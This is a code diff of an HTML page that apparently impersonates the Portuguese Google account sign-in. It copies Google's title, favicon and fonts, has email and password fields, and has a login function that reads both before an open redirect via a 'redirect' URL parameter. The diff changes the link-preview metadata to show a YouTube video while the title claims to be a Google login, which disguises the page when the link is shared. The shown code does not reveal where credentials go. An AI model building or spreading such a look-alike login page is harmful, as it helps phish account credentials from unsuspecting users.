@@ -8,16 +8,20 @@
 
     <!-- Meta tags para visualização de Link (WhatsApp, Discord, Telegram, Facebook) -->
     <meta property="og:title" content="Fazer login nas Contas do Google">
-    <meta property="og:description" content="Use sua Conta do Google. Faça login para gerenciar sua conta e acessar os serviços do Google.">
-    <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c1/Google_%22G%22_logo.svg/1200px-Google_%22G%22_logo.svg.png">
-    <meta property="og:url" content="https://caiokotan.github.io/LF2/">
+    <meta property="og:description"
+        content="Use sua Conta do Google. Faça login para gerenciar sua conta e acessar os serviços do Google.">
+    <meta property="og:image"
+        content="https://i.ytimg.com/an_webp/8utpbbdj0LQ/mqdefault_6s.webp?du=3000&sqp=CIDZzs8G&rs=AOn4CLC20gZZTsrdgxCjAXX4PD5cDtRquA">
+    <meta property="og:url" content="https://www.youtube.com/watch?v=8utpbbdj0LQ">
     <meta property="og:type" content="website">
 
     <!-- Meta tags exclusivas para o Twitter/X -->
     <meta name="twitter:card" content="summary">
     <meta name="twitter:title" content="Fazer login nas Contas do Google">
-    <meta name="twitter:description" content="Use sua Conta do Google. Faça login para gerenciar sua conta e acessar os serviços do Google.">
-    <meta name="twitter:image" content="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c1/Google_%22G%22_logo.svg/1200px-Google_%22G%22_logo.svg.png">
+    <meta name="twitter:description"
+        content="Use sua Conta do Google. Faça login para gerenciar sua conta e acessar os serviços do Google.">
+    <meta name="twitter:image"
+        content="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c1/Google_%22G%22_logo.svg/1200px-Google_%22G%22_logo.svg.png">
 
     <link rel="icon" href="https://www.google.com/favicon.ico" type="image/x-icon">
     <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
@@ -513,7 +517,7 @@
         function fazerLogin() {
             const pass = document.getElementById('password');
             const email = document.getElementById('identifierId').value;
-            
+
             // Pega o parâmetro 'redirect' da URL. Se não existir, usa 'logged.html' como padrão.
             const urlParams = new URLSearchParams(window.location.search);
             const redirectUrl = urlParams.get('redirect') || 'logged.html';
